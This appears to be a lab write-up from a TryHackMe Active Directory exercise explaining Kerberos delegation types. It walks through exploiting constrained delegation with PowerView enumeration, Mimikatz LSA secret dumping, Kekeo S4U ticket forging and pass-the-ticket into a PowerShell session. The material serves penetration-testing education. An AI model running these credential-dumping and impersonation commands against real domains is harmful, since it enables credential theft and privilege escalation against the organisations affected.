# Kerberos Delegation

Kerberos Delegation in Active Directory (AD) allows an application to access resources hosted on a different server on behalf of a user. This is commonly used, for example, when a web server needs to access a SQL database on another server. Instead of giving the service account direct access to the database, delegation allows the service account to request access on behalf of the user, ensuring users only access data they have permissions for.

---

## Types of Kerberos Delegation

### 1. Unconstrained Delegation

- **Description:** The original and least secure form of delegation. Any service ticket presented to a host with unconstrained delegation allows that host to impersonate the user to any service.
- **Risk:** If an attacker compromises a host with unconstrained delegation, they can intercept ticket-granting tickets (TGTs) and impersonate privileged users.
- **Example:** If a privileged account authenticates to a compromised host, the attacker can extract the TGT and use it elsewhere.

### 2. Constrained Delegation

- **Description:** Introduced by Microsoft in 2003 to limit which services an account can delegate to.
- **Configuration:** Only specific services (e.g., HTTP, CIFS, LDAP, HOST, MSSQL) can be delegated.
- **Security:** Reduces risk by limiting exposure if an account is compromised.
- **Exploitation:** If an attacker compromises an account with constrained delegation, they can generate a TGT and request service tickets (TGS) for allowed services, impersonating other users.

### 3. Resource-Based Constrained Delegation (RBCD)

- **Description:** Introduced in 2012, RBCD allows the service itself to specify which accounts can delegate to it, rather than specifying delegation on the account.
- **Configuration:** Set via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
- **Advantage:** Service owners control who can delegate access, providing more granular security.

---

## Exploiting Constrained Delegation

### Enumeration

Use PowerView to enumerate accounts trusted for delegation:

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
```

Suppose the output shows `svcIIS` can delegate to HTTP and WSMAN services on `THMSERVER1`. PowerShell Remoting uses these services, so impersonating a privileged user (e.g., a Tier 1 Admin) could provide administrative access.

### Dumping Credentials

If you have admin access on a host running as `svcIIS`, dump LSASecrets using Mimikatz:

```cmd
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # token::elevate
mimikatz # lsadump::secrets
```

Look for credentials for the `svcIIS` account.

### Performing the Attack

1. **Generate a TGT with Kekeo:**

    ```cmd
    kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<password>
    ```

2. **Forge TGS requests for the target user and services:**

    ```cmd
    kekeo # tgs::s4u /tgt:<TGT_FILE> /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
    kekeo # tgs::s4u /tgt:<TGT_FILE> /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
    ```

3. **Import the TGS tickets with Mimikatz:**

    ```cmd
    mimikatz # privilege::debug
    mimikatz # kerberos::ptt <TGS_HTTP_FILE>
    mimikatz # kerberos::ptt <TGS_WSMAN_FILE>
    ```

4. **Create a PowerShell session as the impersonated user:**

    ```powershell
    New-PSSession -ComputerName thmserver1.za.tryhackme.loc
    Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
    whoami
    ```

    Output should confirm access as the impersonated user (e.g., `za\t1_trevor.jones`).

---

With successful exploitation of constrained delegation, you gain privileged access to the target server.

